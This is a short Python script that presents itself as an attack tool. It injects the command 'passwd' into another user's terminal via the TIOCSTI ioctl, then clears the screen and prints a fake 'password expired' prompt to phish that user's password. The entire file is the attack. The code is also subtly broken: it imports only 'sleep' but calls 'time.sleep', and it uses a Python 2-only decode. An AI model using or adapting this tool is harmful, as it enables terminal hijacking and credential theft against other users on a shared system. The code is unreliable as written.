#!/usr/bin/python

# Author Alexander Korznikov
# Twitter: @nopernik

import termios, fcntl
import sys
from time import sleep

tty = sys.argv[1]

def phish(tty):
   print('\n\n[+] Sending phishing message!\n\n')
   message = '\033[2J\033[0;0H\r\nYour password expired and must be changed\nEnter new UNIX password: '
   with open(tty) as f:
      for c in 'passwd\n'.decode('string_escape'):
         fcntl.ioctl(f,termios.TIOCSTI,c)
   time.sleep(0.05) # I don't know really why, but without sleep it wont work.
   with open(tty,'w') as f: 
      f.write(message)
      f.close()

phish(tty)
